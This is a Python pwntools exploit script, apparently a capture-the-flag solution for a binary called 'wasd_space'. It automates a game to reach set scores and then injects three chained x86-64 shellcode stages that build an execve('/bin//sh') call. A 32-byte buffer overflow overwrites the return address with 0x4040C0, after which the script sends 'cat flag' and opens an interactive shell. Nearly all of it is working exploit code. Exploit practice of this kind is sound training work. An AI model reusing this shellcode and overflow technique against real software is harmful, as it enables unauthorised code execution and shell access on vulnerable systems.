from pwn import *
import time
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
# p = remote('0.0.0.0',6789)
p = process('wasd_space')
shell1 = b'\x48\x31\xf6\x56'
shell1 += b'\xe9\x37'
shell1 += b'\00'

shell2 = b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
shell2 += b'\xe9\x31'
shell2 += b'\00'

shell3 = b'\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' + b'\x90'

def set_first():
	last = shell1+b'A'*(32-len(shell1))
	last += b'SFP_SFP_'
	last += p64(0x4040C0)
	p.sendline(last)
	p.sendline('First_text'.encode())
	pass
def set_second():
	p.sendline(shell2)
	p.sendline('Second_text'.encode())
	pass
def set_third():
	p.sendline(shell3)
	p.sendline('Third_text'.encode())
	p.recvuntil("you are third\n");
	pass
def solve(score):
	p.sendline(b'1')
	count = 0;
	while count < score:
		asdf = p.recvline()
		asdf = p.recvuntil(b"- '")
		print(asdf)
		asdf = p.recv(1)
		p.sendline(asdf)
		count += 100
		pass
	p.sendline(b'!')
	pass

print(p.recvuntil(b'Choice > '))
p.recvline()
solve(1000)
set_third()

print(p.recvuntil(b'Choice > '))
p.recvline()
solve(1200)
set_second()

print(p.recvuntil(b'Choice > '))
solve(1700)
set_first()


# p.recvline()
# p.recvline()
p.sendline(b'cat flag')
p.interactive()